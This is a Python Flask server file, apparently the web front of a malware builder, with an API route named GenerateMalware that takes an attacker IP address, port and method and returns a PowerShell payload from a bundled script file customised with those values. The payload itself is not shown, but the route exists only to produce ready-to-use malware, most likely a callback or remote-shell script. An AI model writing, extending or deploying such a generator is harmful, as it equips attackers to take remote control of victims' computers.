from flask import *
from backend import malwareGeneration
def renderer(path):
    return open(path, "rb").read()

app = Flask(__name__)

@app.route("/")
def main():
    return renderer("frontend\index.html")
@app.route("/js/base.js")
def js():
    return renderer("frontend\\js\\base.js")
# api

@app.route("/api/GenerateMalware/data/<data>")
def GenerateMalware(data : str):
    data = data.split("!:!")
    ip = data[0]
    port = data[1]
    method = data[2]
    mlwr = malwareGeneration.MalwareGenerator(ip, port)
    if(method == "powershell"):
        print(mlwr.FormatMalware(open("backend\malware\powershell\Compagny.ps1", "r").read(), "powershell"))
    return mlwr.FormatMalware(open("backend\malware\powershell\Compagny.ps1", "r").read(), "powershell")


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=8080, debug=True)